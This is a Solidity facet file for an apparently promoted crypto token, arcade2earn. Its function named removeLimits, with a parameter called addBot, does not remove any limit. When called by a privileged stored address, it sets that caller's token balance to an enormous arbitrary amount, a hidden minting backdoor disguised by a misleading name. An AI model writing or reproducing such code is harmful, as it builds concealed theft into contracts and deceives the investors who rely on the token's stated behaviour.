/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.arcade2earn.io/
 * Discord: https://discord.com/invite/hhCm89Tsn7
 * Twitter: https://twitter.com/arcade2earn
 * Telegram: https://t.me/arcade2earn
 */
pragma solidity ^0.8.20;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
